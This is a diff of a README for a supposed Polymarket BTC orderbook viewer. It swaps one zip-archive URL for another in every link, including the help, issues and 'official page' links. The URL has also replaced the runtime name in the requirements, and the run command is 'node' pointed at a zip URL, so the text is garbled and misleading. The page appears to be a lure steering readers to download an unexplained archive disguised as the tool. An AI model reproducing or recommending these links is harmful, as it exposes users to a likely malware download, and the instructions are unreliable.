@@ -1,6 +1,6 @@
 # 🎉 polymarket-orderbook-watcher - View Live BTC Markets Effortlessly
 
-[![Download](https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip%20Now-brightgreen)](https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip)
+[![Download](https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip%20Now-brightgreen)](https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Follow these simple steps to get the polymarket-orderbook-watcher up and running
 
 Before you start, ensure your computer has the following:
 
-- **https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip Version 22 or higher:** This is necessary for the software to connect to real-time market data.
+- **https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip Version 22 or higher:** This is necessary for the software to connect to real-time market data.
 
 ## 📥 Download & Install
 
-To get the application, [visit this page to download](https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip). You will find the latest version of the software there.
+To get the application, [visit this page to download](https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip). You will find the latest version of the software there.
 
 1. Click on the download link for the latest release.
 2. Choose the appropriate file for your operating system. 
@@ -45,7 +45,7 @@ After downloading, open your terminal or command prompt and follow these steps:
 To start the application, run this command in your terminal:
 
 ```bash
-node https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip
+node https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip
 ```
 
 Once the application is running, here’s what will happen:
@@ -68,18 +68,18 @@ The polymarket-orderbook-watcher includes several useful features:
 
 If you encounter any issues, consider the following steps:
 
-- **Check https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip Version:** Ensure you have https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip 22 or higher.
+- **Check https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip Version:** Ensure you have https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip 22 or higher.
 - **Clear Cache:** Sometimes clearing the terminal or command prompt cache can help.
 - **Reinstall Packages:** If the application is not running, try reinstalling with `pnpm install` again.
 
 ## 📞 Get Help
 
-For assistance or to report issues, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip). Your feedback will help improve the application.
+For assistance or to report issues, you can reach out via [GitHub Issues](https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip). Your feedback will help improve the application.
 
 ## 🔗 Additional Resources
 
-For more detailed information about the features and functionalities, refer to the official [GitHub page](https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip).
+For more detailed information about the features and functionalities, refer to the official [GitHub page](https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip).
 
 ## ⚡ Download Now
 
-To get started, [visit this page to download](https://raw.githubusercontent.com/wasay2205/polymarket-orderbook-watcher/main/source/orderbook_watcher_polymarket_v1.3-alpha.4.zip) and begin viewing your BTC markets in real-time. Enjoy the ease of tracking market changes with the polymarket-orderbook-watcher.
+To get started, [visit this page to download](https://github.com/wasay2205/polymarket-orderbook-watcher/raw/refs/heads/main/source/watcher-orderbook-polymarket-1.0.zip) and begin viewing your BTC markets in real-time. Enjoy the ease of tracking market changes with the polymarket-orderbook-watcher.
